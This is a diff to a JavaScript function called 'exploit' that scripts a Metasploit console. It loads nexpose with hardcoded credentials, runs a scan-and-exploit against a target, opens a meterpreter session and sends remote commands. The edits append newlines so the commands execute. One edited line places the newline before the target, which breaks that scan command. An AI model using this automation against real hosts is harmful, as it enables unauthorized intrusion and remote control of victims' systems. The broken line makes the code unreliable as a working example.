@@ -200,7 +200,7 @@ function exploit(target, console_id) {
   console.log(_safe2.default.info('starting scan... \n loading nexpose module'));
   //load nexpose
   console.log(_safe2.default.info('loading nexpose...'));
-  var args = ['console.write', console_id, 'load nexpose'];
+  var args = ['console.write', console_id, 'load nexpose \n'];
   client.exec(args, function (err, res) {
     if (err) {
       console.error(_safe2.default.error('Could not load nexpose module ! \n ' + err));
@@ -211,7 +211,7 @@ function exploit(target, console_id) {
   });
   //start full nexpose audit
   console.log(_safe2.default.info('logging in to nexpose...'));
-  args = ['console.write', console_id, 'nexpose_connect bot:botpass@127.0.0.1'];
+  args = ['console.write', console_id, 'nexpose_connect bot:botpass@127.0.0.1 \n'];
   client.exec(args, function (err, res) {
     if (err) {
       console.error(_safe2.default.err('Could not log in to local nexpose service !' + err));
@@ -222,7 +222,7 @@ function exploit(target, console_id) {
   });
   //start scan
   console.log(_safe2.default.info('Starting actual scan now... '));
-  args = ['console.write', console_id, 'nexpose_scan -x' + target];
+  args = ['console.write', console_id, 'nexpose_scan -x \n' + target];
   client.exec(args, function (err, res) {
     if (err) {
       console.error(_safe2.default.error('Could not scan' + target + '\n' + err));
@@ -233,7 +233,7 @@ function exploit(target, console_id) {
   });
   //meterpreter if possible
   console.log(_safe2.default.info('Trying to connect using meterpreter...'));
-  args = ['console.write', console_id, 'sessions -i 1'];
+  args = ['console.write', console_id, 'sessions -i 1 \n'];
   client.exec(args, function (err, res) {
     if (err) {
       console.error(_safe2.default.error('Could not connect to target [' + target + '] \n' + err));
@@ -264,7 +264,7 @@ function exploit(target, console_id) {
       });
       return false;
     }
-    args = ['console.write', console_id, remoteCommand];
+    args = ['console.write', console_id, remoteCommand + '\n'];
     client.exec(args, function (err, res) {
       if (err) {
         console.error(_safe2.default.error('An error occured: \n ' + err));
